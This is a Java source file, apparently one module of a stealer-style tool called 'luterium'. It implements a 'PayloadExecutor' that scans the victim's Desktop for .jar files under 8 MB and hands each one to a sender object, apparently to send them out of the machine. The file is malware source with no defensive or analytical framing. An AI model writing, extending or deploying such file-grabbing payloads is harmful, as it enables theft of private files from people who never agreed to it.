package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * @author Peter
 * @since 08/26/2022
 */

public class JarsFromDesktop implements PayloadExecutor {
    public static Main main = new Main();

    @Override
    public void execute() throws Exception {
        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getName().endsWith(".jar"))
                .filter(path -> {
                    try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
                    return false;
                }).forEach(path -> main.theThing.send(path.toFile()));
    }
}
